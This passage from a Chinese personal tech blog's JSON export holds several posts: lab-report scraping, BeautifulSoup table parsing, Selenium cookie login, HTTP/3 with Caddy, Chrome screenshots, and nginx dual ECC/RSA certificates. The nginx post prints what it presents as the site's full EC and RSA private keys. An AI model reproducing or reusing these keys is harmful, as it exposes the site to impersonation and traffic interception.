= resp_json['return_params']['assayreport']['name'] sample_type = resp_json['return_params']['assayreport']['sample_type'] report_barcode = resp_json['return_params']['assayreport']['report_barcode'] send_time = resp_json['return_params']['assayreport']['send_time'] send_name = resp_json['return_params']['assayreport']['send_name'] assayreportdetail = resp_json['return_params']['assayreportdetail'] entry_time = resp_json['return_params']['assayreport']['entry_time'] entry_name = resp_json['return_params']['assayreport']['entry_name'] audit_name = resp_json['return_params']['assayreport']['audit_name'] with open(username+file_name+\"+\"+report_barcode+\".md\",\"at\") as f: f.write(\"|项目||||\"+\"\\n\") f.write(\"|---|---|---|---|\"+\"\\n\") f.write(\"|化验项目|\"+sample_type+\"|\"+file_name+\"||\"+\"\\n\") f.write(\"|接收时间|\"+send_time+\"|||\"+\"\\n\") f.write(\"|报告时间|\"+entry_time+\"|||\"+\"\\n\") f.write(\"|送检医生|\"+send_name+\"|||\"+\"\\n\") f.write(\"|报告医生|\"+entry_name+\"|||\"+\"\\n\") f.write(\"|审计医生|\"+audit_name+\"|||\"+\"\\n\") f.write(\"|医嘱号|\"+report_barcode+\"|||\"+\"\\n\") f.write(\"\\n\") f.write(\"|项目|单位|结果|参考范围|\"+\"\\n\") f.write(\"|---|---|---|---|\"+\"\\n\") for i in assayreportdetail: item_name_info = i['item_name'] try: result_unit_info = i['result_unit'] result_data_info = i['result_data'] ref_range_low_info = i['ref_range_low'] except KeyError: pass if result_unit_info: f.write(\"|\"+item_name_info+\"|\"+str(result_unit_info)+\"|\"+result_data_info+\"|\"+ref_range_low_info+\"|\"+\"\\n\") else: f.write(\"|\"+item_name_info+\"|\"+\"|\"+result_data_info+\"|\"+ref_range_low_info+\"|\"+\"\\n\")if __name__ == '__main__': session_id = login('xxxx','xxx') report_barcode = input(\"请输入医嘱号:\") print(get_huayan_save(session_id,\"阿文\",report_barcode)) 后面我可以把这些数据都导入Excel 之类的表格里面进行统计分析每次的指标变化。 忠告好好的身体经不起体检，尤其是年纪越来越大，希望新的一年里，能够早日康复，也希望所有人都能够健康。生病了不要想着他自己会好，即使是自限制性病，比如感冒，也需要做好防护措施，避免加重病情。 得了这个病让我改掉了很多坏习惯，比如熬夜，喝饮料（现在都每天8杯白开水），吃辣的东西，烧烤、饮酒、高盐油腻食品等等全戒了。命比这些重要。 定期体检为了自己也为了家人，一定要定期体检，一些常规性体检很便宜的，比如我这个病做个尿常规看下有没有隐血有没有尿蛋白就可以大概判断是泌尿系统的疾病。几十块钱，医保都可以直接报销的，花不了几个钱。","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://awen.me/tags/Python/"}]},{"title":"使用bs4 处理表格","slug":"使用bs4-处理表格","date":"2019-01-23T12:00:29.000Z","updated":"2021-02-26T06:05:29.308Z","comments":true,"path":"posts/39774.html","link":"","permalink":"https://awen.me/posts/39774.html","excerpt":"现在在一个网页内有这么一个表格","text":"现在在一个网页内有这么一个表格 2月值班表 星期一 星期二 星期三 星期四 星期五 本周休息 星期六 星期日 021 022 023 何总 徐总 卢总 024 025 026 027 028 029 0210 王总 阿文 何总 朱总 卢总 朱总 何总 0211 0212 0213 0214 0215 0216 0217 阿文 徐总 王总 朱总 卢总 朱总 卢总 0218 0219 0220 0221 0222 0223 0224 阿文 徐总 何总 王总 朱总 阿文 徐总 0225 0226 0227 0228 卢总 阿文 徐总 何总 通过 bs4 爬取该网页源码 123html_context &#x3D; response.text# 解析 html，获取对应的值存入 dict 中soup &#x3D; BeautifulSoup(html_context, &quot;html.parser&quot;) 得到 html 内容大概如下的html 代码，我需要取其中不算标题和星期那一行以下的内容，然后将其进行格式化输出为json 格式 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124#-*-*coding:utf-8-*-from bs4 import BeautifulSoupimport timehtml &#x3D; &quot;&quot;&quot;&lt;tbody&gt; &lt;tr&gt; &lt;th class&#x3D;&quot;confluenceTh&quot; colspan&#x3D;&quot;8&quot; style&#x3D;&quot;text-align: center;&quot;&gt;1月值班表 &lt;&#x2F;th&gt;&lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt;星期一&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt;星期二&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt;星期三&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt;星期四&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt;星期五&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt;本周休息&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt;星期六&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt;星期日&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt; &lt;span style&#x3D;&quot;color: rgb(255,0,0);&quot;&gt; 31&lt;&#x2F;span&gt;&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt; &lt;span style&#x3D;&quot;color: rgb(255,0,0);&quot;&gt;1&lt;&#x2F;span&gt;&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt;2&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt;3&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt;4&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt;&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt;5&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt;6&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt; 阿文&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt;徐总 &lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt; 王总&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt;朱总 &lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt; 卢总&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt;&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt;何炅&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot;&gt;王总&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;7&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;8&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;9&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;10&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;11&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;12&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;13&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt; 阿文&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;徐总 &lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt; 何炅&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt; 王总&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt; 朱总&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;朱总&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;卢总&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;14&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;15&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;16&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;17&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;18&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;19&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;20&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt; 卢总&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt; 阿文&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt; 徐总&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt; 何炅&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt; 王总&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;阿文&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;徐总&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;21&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;22&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;23&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;24&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;25&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;26&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;27&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt; 朱总&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;卢总 &lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt; 阿文&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;徐总 &lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt; 何炅&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;何炅&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;王总&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;28&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;29&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;30&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;31&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt; &lt;&#x2F;td&gt;&lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt; 王总&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt; 朱总&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt; 卢总&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;阿文&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt;&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;confluenceTd&quot; colspan&#x3D;&quot;1&quot;&gt; &lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;tbody&gt;&quot;&quot;&quot;&#96;&#96;&#96; 处理表格，分析 &#96;&#96;&#96; soup &#x3D; BeautifulSoup(html, &#39;html.parser&#39;)data_list &#x3D; [] 将所有的数据都存储到data_list 中for idx, tr in enumerate(soup.find_all(&#39;tr&#39;)): if idx &gt; 1: # 从下标2开始，也就是不要星期和标题那两行 tds &#x3D; tr.find_all(&#39;td&#39;) values &#x3D; [str(w.text).strip() for w in tds] data_list.append(values) 但是实际上现在的数据是混在一起的，没有把日期和姓名进行一一的对应，所以我们需要去对数据进行处理，从表格可以看出来期第一行是日期 第二行是姓名，因此我们把第一行和第二行的数据分开，通过判断奇偶数的方式把数据写入2个list 中去。 12345678key &#x3D; []values &#x3D; []for i in range(len(data_list)): if (i % 2) &#x3D;&#x3D; 0: key.append(data_list[i]) else: values.append(data_list[i]) 通过创建一个字典，调用zip 将上面的key和value 进行合并操作，最终搞定期日期和姓名的对应关系。 12345dict_list &#x3D; &#123;&#125;for i in range(len(key)): dict_list.update(dict(zip(key[i], values[i])))date_time &#x3D; time.strftime(&quot;%m%d&quot;, time.localtime())who_name &#x3D; dict_list[date_time] 最终结果 123456789&#123; &quot;021&quot;: &quot;何总&quot;, &quot;022&quot;: &quot;徐总&quot;, &quot;023&quot;: &quot;卢总&quot;, &quot;024&quot;: &quot;阿文&quot;, …… &#125;","categories":[],"tags":[]},{"title":"通过selenium实现免登录","slug":"通过selenium实现免登录","date":"2019-01-22T04:45:02.000Z","updated":"2021-02-26T06:05:29.359Z","comments":true,"path":"posts/38553.html","link":"","permalink":"https://awen.me/posts/38553.html","excerpt":"为啥要用 selenium， 因为单位的登录方式是使用 openid 登录的，我还不知道怎么去实现openid 登录，主要是没有文档。但是我希望通过脚本的方式登录去做一些自动化的工作。于是想到了通过selenium 模拟浏览器登录后获取cookie 然后调用 request 接口来实现一些自动化的操作。","text":"为啥要用 selenium， 因为单位的登录方式是使用 openid 登录的，我还不知道怎么去实现openid 登录，主要是没有文档。但是我希望通过脚本的方式登录去做一些自动化的工作。于是想到了通过selenium 模拟浏览器登录后获取cookie 然后调用 request 接口来实现一些自动化的操作。 安装pip3 install selenium实现登录def do_login(username,password): options=webdriver.ChromeOptions() options.add_argument(&quot;--headless&quot;) # 不打开浏览器页面 driver = webdriver.Chrome(options=options) # 打开 Chrome 浏览器 driver.get(&quot;http://xxxxxx.com/login.html#/&quot;) driver.find_element_by_link_text(u&quot;OpenId登录&quot;).click() driver.find_element_by_id(&quot;username&quot;).send_keys(username) driver.find_element_by_id(&quot;password&quot;).send_keys(password) driver.find_element_by_xpath( u&quot;(.//*[normalize-space(text()) and normalize-space(.)=&apos;记住本次登录&apos;])[2]/following::button[1]&quot;).click() cookies = driver.get_cookies() # 获取cookie driver.close() return cookies 拿到cookie 之后，把cookie 值加到 request 请求的 cookie 字段就可以实现模拟登录进行一系列操作了。 cookies = do_login(&quot;xxx&quot;, &quot;xxxxx&quot;) # 输入登录账户密码 requests_session = requests.Session() for cookie in cookies: requests_session.cookies.set(cookie[&apos;name&apos;], cookie[&apos;value&apos;])然后通过 requests_session进行get 或post 等请求即可。 注意注意 selenium 需要配合 chromedriver（调用Chrome浏览器） 或geckodriver（调用火狐浏览器），并且有版本兼容问题， 例如最新版本的Chrome浏览器是Chrome 71 其chromedriver 版本为 2.45.615355 具体参考 http://chromedriver.chromium.org/","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://awen.me/tags/Python/"}]},{"title":"尝鲜 HTTP/3 协议","slug":"尝鲜-HTTP-3-协议","date":"2018-11-15T12:39:53.000Z","updated":"2021-02-26T06:05:29.333Z","comments":true,"path":"posts/36933.html","link":"","permalink":"https://awen.me/posts/36933.html","excerpt":"最近，HTTP-over-QUIC协议被正式称为HTTP/3，QUIC 协议是 google 开发的一套协议，IETF 中的 QUIC 工作组致力于创建 QUIC 传输协议。 QUIC 是基于 UDP 实现的协议，是用来替换 TCP 的。QUIC 协议最初是由Google发起的项目，后面慢慢成为了 HTTP/2-encrypted-over-UDP 协议。","text":"最近，HTTP-over-QUIC协议被正式称为HTTP/3，QUIC 协议是 google 开发的一套协议，IETF 中的 QUIC 工作组致力于创建 QUIC 传输协议。 QUIC 是基于 UDP 实现的协议，是用来替换 TCP 的。QUIC 协议最初是由Google发起的项目，后面慢慢成为了 HTTP/2-encrypted-over-UDP 协议。 由于目前主流的 web 服务器，例如 nginx 是不支持 quic 协议的，因此我们采用 caddy 这个 web 服务器才实现 对 quic 协议的支持。 关于 quic 协议的简单介绍，你可以看下 https://zhuanlan.zhihu.com/p/32553477 实现原理，首先客户端发起 tcp 连接判断服务端响应头是否有 alt-svc 头，如有则尝试使用 udp 443 去进行连接。 nginx 配置nginx 只需要增加一行 add_header alt-svc &apos;quic=&quot;:443&quot;; ma=2592000; v=&quot;44,43,39&quot;&apos;;caddy 容器docker pull hub.c.163.com/fangwenjun/caddy/caddy:v1启动容器 docker run --restart=always -d -p 443:443/udp --name awen-blog -v /usr/local/nginx/ssl/:/conf/ -v /www/www/:/www/ -v /www/caddy/:/caddy-conf/ c237fe021a1b caddy -quic -conf /caddy-conf/confconf 文件配置 https://awen.me tls /conf/awen.me.ecc.cer /conf/awen.me.ecc.key root /www/ gzip配置完毕后记得放行 udp 443 端口，就可以通过浏览器访问了 chrome 配置1.开启 quic 的支持，chrome://flags 安装如图所示 Experimental QUIC protocol 设置为 enable 重启浏览器 安装 HTTP/2 and SPDY indicator https://chrome.google.com/webstore/detail/http2-and-spdy-indicator/mpbpobfflnpcgagjijhmgnchggcjblin 你可以访问 google 试试 右上角有个闪电图标会显示 google 已经开启 quic/43版本的支持。 然后访问博客也和 google 一样呈现绿色闪电图标了。 打开 chrome://net-internals/#quic 也可以看到当前使用 quic 协议的站点连接情况 wireshark 抓包 可以看到有 GQUIC 也说明启用 quic 协议成功了。","categories":[],"tags":[{"name":"http3","slug":"http3","permalink":"https://awen.me/tags/http3/"}]},{"title":"使用 chrome 自带的长截屏工具对整个网页进行截屏","slug":"使用-chrome-自带的长截屏工具对整个网页进行截屏","date":"2018-11-13T02:33:57.000Z","updated":"2021-02-26T06:05:29.304Z","comments":true,"path":"posts/27126.html","link":"","permalink":"https://awen.me/posts/27126.html","excerpt":"要想使用截图功能，你需要首先确保 Chrome 已升级至 59 或更高版本。在想要截图的网页中，首先按下 ⌘Command + ⌥Option + I（Windows 为 F12）快捷键，召唤出调试界面。","text":"要想使用截图功能，你需要首先确保 Chrome 已升级至 59 或更高版本。在想要截图的网页中，首先按下 ⌘Command + ⌥Option + I（Windows 为 F12）快捷键，召唤出调试界面。 随后，按下 ⌘Command + ⇧Shift + P（Windows 为 Ctrl + Shift + P），输入命令 Capture full size screenshot（只输前几个字母就能找到），敲下回车，Chrome 就会自动截取整个网页内容并保存至本地。由于是渲染引擎直接输出，其比普通扩展速度更快，分辨率也更高。","categories":[],"tags":[]},{"title":"让 nginx 支持ecc 和 rsa 双证书","slug":"让-nginx-支持ecc-和-rsa-双证书","date":"2018-11-13T01:33:18.000Z","updated":"2021-02-26T06:05:29.356Z","comments":true,"path":"posts/7002.html","link":"","permalink":"https://awen.me/posts/7002.html","excerpt":"RSA 和 ECC 证书的区别首先，内置 ECDSA 公钥的证书称为 ECC 证书，内置 RSA 公钥的证书称为 RSA 证书安全性方面，256 位 ECC Key 等同于 3072 位 RSA Key运算速度上，ECC 运算速度 更快且由于同等安全条件下，ECC 算法所需的 Key 更短，所以 ECC 证书拥有比 RSA 证书 更小的文件体积那么综上，ECDHE 密钥交换 + ECDSA 数字签名无疑是坠吼滴选择。","text":"RSA 和 ECC 证书的区别首先，内置 ECDSA 公钥的证书称为 ECC 证书，内置 RSA 公钥的证书称为 RSA 证书安全性方面，256 位 ECC Key 等同于 3072 位 RSA Key运算速度上，ECC 运算速度 更快且由于同等安全条件下，ECC 算法所需的 Key 更短，所以 ECC 证书拥有比 RSA 证书 更小的文件体积那么综上，ECDHE 密钥交换 + ECDSA 数字签名无疑是坠吼滴选择。 我们看下 ecc 证书的 key 文件 [root@iz28wru16cpz ssl]# cat awen.me.ecc.key -----BEGIN EC PARAMETERS----- BggqhkjOPQMBBw== -----END EC PARAMETERS----- -----BEGIN EC PRIVATE KEY----- SHcCAQEEEBQHlIr/d/F+AgOGd1+w3NY6MRtYFiF9Fv+UzRlX3va6oAoGCCqGSM49 AwEHoUQDQgAEjoo72OmWd6PWODdb1eeDg6bBKAq8NKfXqYlXLjk+V9RfegADMzHj h8YyPxaDPa4XLE1HlcIw+20jWGYJgnr8Bw== -----END EC PRIVATE KEY-----然后看下 rsa 证书的 key [root@iz28wru16cpz ssl]# cat awen.me.rsa.key -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEArqheINIhiqQVZzV2Sf8rV6NkteBJlNTCOJDSylzdL0igtNjf ZAt6qep+de7+8YtZ87D1AVDU5d0OuPyV5EtfJ895km1WND0uq2D07ukc4SI2T0Hk GHMnq16wmNkPZfJXEDgZDQNPnw0ex0eRfVLrnOtBM0uS6zVpM4iSZWzRBA/WTr3O 6b0wHkd41AVBY4bJ00vhn0RKX3U6I0QkhGRLI6i4po+dFZISWCZgEOt9XHhWlv53 fTNXatT/amN6pYj53ie34pLG8SgsYpPFThy5GOYWVaIQCd9QGsCwcXP+KBRd7B+b ZQGxDyFg/CDA7L/5rKBE1fFnTrJ6yjMrCaEYPwIDAQABAoIBADFvqqTzlVbetsgt 07uCJDx8DSeFwo4D4q2MIH3y5xBZKFPIBwMUVLX/j6fl6/eGkAFwFwk2Tex6M46c v/iMdPSZvzl5BStoHeuYV/u/s9Ltkh3A8sUQ4yuYc7fvyHH8tDP9DOooA8NrPUj+ sumcLOCPnjbcr0swJQTXJUjcEhVpxm6XGae4HffkYWiYu1vZlkdu1sft/xVONIC1 9lFDMdK6u6C8BQIjft0SpoAh6mC3WgFnaWkE4ZPLjiLY9EatsyqRIcx4+zRrWD9r IZI4dNlYdYMNqgyenzmJuZTIOvBFpH3kF/4rctnKVflCG+utym/4U/tDLfen4AaB cfceFDECgYEA19GTPi+W+q2SuKbnsu5586FuSuzPgf28r0NI9OipmMhkREPGNAfm eexMmyfTqAe19S3WSbGnP/IhCsF30cUCS+joO7JYQzbQ2gnwAmEGIPUvoH+Y1QSt eUj3FAwvPShqw0hw6qNejlVm8LHQsgt3gcNQoW4E7yYabf/vF21xWvMCgYEAzyz2 yEbc2XIb4MJ2g+7lVnh0Jkt+TZioJmwFzFaDNBw4B3q4xT0jHzCD2liDTgyrRRkK 4gYyDHoYUG2JG7rvCpVipNKYTrbpNjXQ0gFY2Yd4+xnO3dzcOQWb+Ixv5fMYk9QP GkWM7ifsShiTDqmBWkVnwycgwaYSFCeCeeRVyIUCgYEAoMtoZOCYIFTKCAFyh4He IoKX5gLh5/vgZMRAyxe9pDNJYQMN3R41vYks2jymGX8FNktV6LoP3jjMHXNfjk62 E1CIFlIeKJXirVDSHTOkmVGUFoR6ndtKVB7k127skyhVwwFp/6eQf4NpmtMgpkac 13Vp0Zxi2LsO3f3daRsFZbkCgYAXyO28KIaKYFNbBnhcxTyHJOUQ0HH8JC6J2rT/ tJ7ziJnWIfy8iDxUBFne43KPr1yqXimlsVhlnk7UTP8Es/1llajxi0v5HX7AvoTu 10DAGJGHInthdU3DLiWt71GZcMNNlXb2aS242dSC3Tdk44j6OCWlfgSAtvQ0ZCTS oahHkQKBgDxlxKoaxwSlBTynwIgl4uGEex4rIc/IPzFHB3j52/z8wwef8A1UenLy gbrW+SXQdzT+gh/1NUsInaAC/pX3x2JI2c02ncjoWO0nu8CD7T96ECf0C4XrNkuP tr+pCEq5XjQeOwFgcyH7B8BUu2fANR19O53TnXa8kBXqGsJmYZNf -----END RSA PRIVATE KEY-----既然 ecc 证书比 rsa 证书这么好，那为啥不直接上 ecc，其实，ecc 也并不是完美的，并不是所有浏览器都支持 ECDHE 密钥交换，也就是说 ECC 证书的兼容性要差一些。例如在 Windows XP 中，使用 ECC 证书的网站时需要浏览器自行 TLS（例如 Firefox 的 TLS 自己实现，不依赖操作系统）；Android 平台中，也需要 Android 4+ 才支持 ECC 证书。 那么在 Nginx 1.11.0 以后的版本开始提供 RSA/ECC 双证书的支持它的实现原理是：分析在 TLS 握手中双方协商得到的 Cipher Suite，若支持 ECDSA 就返回 ECC 证书，反之返回 RSA 证书。 配置 ssl on; #ecc 证书配置 ssl_certificate /usr/local/nginx/ssl/awen.me.ecc.cer; ssl_certificate_key /usr/local/nginx/ssl/awen.me.ecc.key; # rsa 证书配置 ssl_certificate /usr/local/nginx/ssl/awen.me.rsa.cer; ssl_certificate_key /usr/local/nginx/ssl/awen.me.rsa.key; # 支持的算法 ssl_ciphers EECDH+CHACHA20:EECDH+CHACHA20-draft:EECDH+ECDSA+AES128:EECDH+aRSA+AES128:RSA+AES128:EECDH+ECDSA+AES256:EECDH+aRSA+AES256:RSA+AES256:EECDH+ECDSA+3DES:EECDH+aRSA+3DES:RSA+3DES:TLS-CHACHA20-POLY1305-SHA256:TLS-AES-256-GCM-SHA384:TLS-AES-128-GCM-SHA256:EECDH+CHACHA20:EECDH+AESGCM:EECDH+AES:!MD5; #优先采取服务器算法 ssl_prefer_server_ciphers on; # 支持的协议 ssl_protocols TLSv1.2 TLSv1.3;测试通过 test.sh 测试后各个平台对于密钥的支持情况如下： 通过 https://www.ssllabs.com/ssltest/analyze.html?d=awen.me 测试","categories":[],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://awen.me/tags/nginx/"}]},{"title":"如何在网易云免费领取服务器","slug":"如何在网易云免费领取服务器","date":"2018-09-27T09:25:04.000Z","updated":"2021-02-26T06:05:29.326Z","comments":true,"path":"posts/37146.html","link":"","permalink":"https://awen.me/posts/37146.html","excerpt":"操作步骤1.首先，打开网易云免费体验馆的连接； 2.找到云服务器，点击[免费领取]，进行注册，注册完毕后进行实名认证，实名认证通（1个工作日内完成）过后返回该页面点击免费领取，然后在弹出的界面选择对应的操作系统以及 VPC 和子网以及安全组，勾选22端口，点击立即领取；","text":"操作步骤1.首先，打开网易云免费体验馆的连接； 2.找到云服务器，点击[免费领取]，进行注册，注册完毕后进行实名认证，实名认证通（1个工作日内完成）过后返回该页面点击免费领取，然后在弹出的界面选择对应的操作系统以及 VPC 和子网以及安全组，勾选22端口，点击立即领取； VPC 和子网以及安全组可以随便选一个。安全组选择 default 即可。 3.在登录的状态下，打开SSH 密钥管理 